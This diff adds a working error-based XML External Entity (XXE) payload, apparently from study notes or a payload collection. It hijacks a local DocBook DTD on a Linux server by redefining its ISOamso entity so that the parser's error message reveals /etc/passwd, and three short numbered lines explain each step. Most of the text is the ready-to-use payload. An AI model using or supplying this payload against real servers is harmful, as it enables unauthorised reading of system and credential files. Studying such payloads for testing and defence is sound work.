@@ -1,0 +1,19 @@
+<!DOCTYPE message[
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+
+
+
+
+
+1-The first ENTITY, local_dtd, contains the contents of the external DTD file that exists on the hypothetical Linux server.
+2-The second ENTITY, ISOamso, already exists in the external DTD and its being redefined to contain the same exploit as from the above method (XXE via Error Parsing). It will trigger an error, which will hopefully cause the error message to reveal the contents of /etc/passwd.
+3-local_dtd is then called so that the external DTD is interpreted, including its newly redefined ISOamso value.
